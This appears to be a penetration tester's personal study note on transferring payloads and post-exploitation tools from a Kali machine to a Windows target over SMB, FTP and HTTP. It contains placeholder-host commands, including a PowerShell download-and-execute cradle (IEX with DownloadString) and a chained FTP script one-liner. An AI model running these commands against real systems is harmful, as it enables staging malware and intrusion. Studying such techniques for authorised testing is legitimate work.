---
type: info
scope: []
aliases: ["uploading payloads"]
related: [
created: 13-03-2023 04:17
---
%%
related::
%%

#todo 

## Overview

Transferring files from Kali to Windows is important for uploading pentesting executables

- Payloads
	- [[Metasploit|Meterpreter]]
	- [[Empire]]
	- Reverse shells
- Executables
	- [[PowerSploit]]
	- [[WinPEAS]]
	- [[Tools/Bloodhound|Sharphound]]

## Methods

- Hosting Servers
	- [[#HTTP Server]]
	- [[#SMB Server]]
	- [[#FTP Server]]
- Others
	- SCP
	- Post-exploitation frameworks

### SMB Server
**Kali Linux - Starting SMB Server**
```bash
impacket-smbserver -username kali -password kali <shareName> <shareDir>

# current dir
impacket-smbserver -username kali -password kali KALI $(pwd)
```

**PowerShell**
```powershell
# PowerShell
$pass = convertto-securestring "kali" -asplaintext -force
$creds = new-object system.management.automation.pscredential('kali', $pass)
new-psdrive -name kali -psprovider filesystem -credential $creds -root \\10.10.14.26\KALI
cd kali:\\
```

### FTP Server
- All Windows come with `ftp.exe` client

**Kali Linux - Starting FTP Server**
```bash
python -m pip install pyftpdlib
python -m pyftpdlib -w -p 21
```

**PowerShell - Downloading File with FTP**
```powershell
# normal use
ftp <ip> # anonymous:*
...
get <file> # download
put <file> # uplaod

# one line (only cmd.exe, use cmd.exe in ps to launch)
# echo open <ip> >> ftp.txt
# &echo user anonymous pass >> ftp.txt
# &echo binary >> ftp.txt
# &echo get <file> >> ftp.txt
# &echo bye >> ftp.txt
# &ftp -s:ftp.txt
# &del ftp.txt

echo open <ip> >> ftp.txt &echo anonymous >> ftp.txt &echo password >> ftp.txt &echo binary >> ftp.txt &echo get <file> >> ftp.txt &echo bye >> ftp.txt &ftp -s:ftp.txt &del ftp.txt
```

### HTTP Server
- Use HTTP server to host static content
- Unlike SMB and FTP, doesn't allow transfer from target to attacker machine
- Http server
	- Windows : `Invoke-WebRequest` / `IEX`
	- `Invoke-WebRequest -Uri <URI> -OutFile <OUT_FILE>`
	- `python -m http.server 80`
- **Apache Server**
	- Kali installed default
	- More resources used
	- Upload file to `/var/wwww/html`
- **Python HTTP Server** (*preferred*)
	- `python -m http.server <port>`
	- Serves current directory

**Kali Linux - Starting HTTP Server**
```bash
# a. Python (preferred)
python -m http.server <PORT>
# serves current dir

# b. Apache
systemctl start apache2
# upload files to /var/www/html
```

**PowerShell - Retrieving HTTP File**
```powershell
# a. Download File
(New-Object System.Net.WebClient).DownloadFile(<URL>, <ABS_PATH_OUT>)

# b. Download File (PowerShell 3.0 and up)
wget <URL> -OutFile <OUT_FILE>
## Aliases: Invoke-WebRequest, wget, curl

# c. Execute File (only PowerShell scripts)
Invoke-Expression(New-Object System.Net.WebClient).DownloadString(<URL>)
## Aliases: Invoke-Expression, iex
```

### Post-exploitation Frameworks
- Examples
	- [[Metasploit|Meterpreter]]
	- [[Empire]]
- Usually have built-in payload transfer with shell session
	- However, if no shell session, need use the above methods
	- Hence, this is usually used for uploading executables

### Protocols
- SSH
- SCP

## References
- https://blog.ropnop.com/transferring-files-from-kali-to-windows/